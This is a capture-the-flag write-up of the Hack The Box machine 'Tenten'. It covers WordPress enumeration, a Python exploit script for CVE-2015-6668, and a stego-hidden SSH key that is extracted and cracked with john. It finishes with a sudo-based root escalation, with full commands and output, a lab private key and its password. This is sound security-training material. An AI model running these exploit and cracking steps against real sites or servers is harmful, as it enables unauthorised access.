---
permalink: /posts/HTB/Tenten
title:  "HTB Tenten"
author: Luc Kolen
description: "Tenten is a medium Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Linux
  - WordPress
  - Steganography
  - John
---
# 10.10.10.10 - Tenten

- [10.10.10.10 - Tenten](#10101010---tenten)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Tenten$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.10
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp|http|Apache httpd 2.4.18 ((Ubuntu))

## HTTP

Browsing to `http://10.10.10.10/` shows `Job Portal - Just another WordPess site` in the title.

```bash
luc@kali:~/HTB/Tenten$ wpscan --url http://10.10.10.10 --enumerate u
...
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
...
[i] User(s) Identified:

[+] takis
...
luc@kali:~/HTB/Tenten$ searchsploit wordpress 4.7.3
...
WordPress Core < 4.7.4 - Unauthorized Password Reset | linux/webapps/41963.txt
...
luc@kali:~/HTB/Tenten$ searchsploit -m linux/webapps/41963.txt
```

We can use `wpscan` which is made for scanning WordPress websites to identity the version that's used. We can also see that there is at least one user, `takis`. `Searchsploit` helps us search for exploits and we find [WordPress Core < 4.7.4 - Unauthorized Password Reset](https://www.exploit-db.com/exploits/41963). 41963 needs the attacked user to answer an email so we can't use this exploit.

```bash
luc@kali:~/HTB/Tenten$ wpscan --url http://10.10.10.10 --api-token *******************************************
...
[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8167
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
...
```

We can go back to `wpscan`, but by entering an `api-token` we get vulnerability information. `CVE-2015-6668` sounds interesting and browsing to [vagmour.eu](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/) we get a Python script.

```python
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2016):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

This script will brute force the year and month to find uploaded files.

```bash
luc@kali:~/HTB/Tenten$ for i in $(seq 1 15); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
1: <title>Job Application: Hello world! &#8211; Job Portal</title>
2: <title>Job Application: Sample Page &#8211; Job Portal</title>
3: <title>Job Application: Auto Draft &#8211; Job Portal</title>
4: <title>Job Application &#8211; Job Portal</title>
5: <title>Job Application: Jobs Listing &#8211; Job Portal</title>
6: <title>Job Application: Job Application &#8211; Job Portal</title>
7: <title>Job Application: Register &#8211; Job Portal</title>
8: <title>Job Application: Pen Tester &#8211; Job Portal</title>
9: <title>Job Application:  &#8211; Job Portal</title>
10: <title>Job Application: Application &#8211; Job Portal</title>
11: <title>Job Application: cube &#8211; Job Portal</title>
12: <title>Job Application: Application &#8211; Job Portal</title>
13: <title>Job Application: HackerAccessGranted &#8211; Job Portal</title>
14: <title>Job Application &#8211; Job Portal</title>
15: <title>Job Application &#8211; Job Portal</title>
```

We can use this small bash script to brute force items exposed via the Job Manger plugin. `13` shows `HackerAccessGranted` which sounds very interesting so we'll use the Python script we found earlier to search for that file.

```bash
luc@kali:~/HTB/Tenten$ python search.py

CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
```

We get no result when running the Python script.

```bash
luc@kali:~/HTB/Tenten$ nano search.py
...
for year in range(2013,2020):
...
for extension in {'doc','pdf','docx','png','jpeg','jpg'}:
...
luc@kali:~/HTB/Tenten$ python search.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

Changing the date range and the filetypes to search for did give us a result.

```bash
luc@kali:~/HTB/Tenten$ wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
luc@kali:~/HTB/Tenten$ steghide extract -sf HackerAccessGranted.jpg
Enter passphrase:
wrote extracted data to "id_rsa".
luc@kali:~/HTB/Tenten$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```

We can extract data from this image with `steghide` and that data is a encrypted SSH key.

```bash
luc@kali:~/HTB/Tenten$ locate ssh2john
/usr/share/john/ssh2john.py
luc@kali:~/HTB/Tenten$ /usr/share/john/ssh2john.py id_rsa > id_rsa.john
luc@kali:~/HTB/Tenten$ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2020-06-26 12:21) 0.4065g/s 5829Kp/s 5829Kc/s 5829KC/sa6_123..*7¡Vamos!
Session completed
luc@kali:~/HTB/Tenten$ chmod 600 id_rsa
luc@kali:~/HTB/Tenten$ ssh takis@10.10.10.10 -i id_rsa
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.10.10 (10.10.10.10)' can't be established.
ECDSA key fingerprint is SHA256:AxKIYOMkqGk3v+ZKgHEM6QcEDw8c8/qi1l0CMNSx8uQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.10' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': superpassword
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.

Last login: Fri May  5 23:05:36 2017
takis@tenten:~$ id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
takis@tenten:~$ cat user.txt
e5c7ed3b************************
```

`John` finds the password for the SSH key, `superpassword` and we already had the username `takis`.

## Privilege escalation

```bash
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
takis@tenten:~$ sudo /bin/fuckin /bin/bash
root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tenten:~# cat /root/root.txt
f9f7291e************************
```

This might be the easiest privilege escalation ever. `Takis` can run `/bin/fuckin` as `root` without a password and `/bin/fuckin` just takes 4 arguments and will execute those. Passing `/bin/bash` as an argument will run that as `root` giving us a `root` shell.

## TL;DR

- Vulnerable WordPress plugin shows all items
- Download image with hidden SSH key
- Crack password for hidden SSH key
- User can run application as root
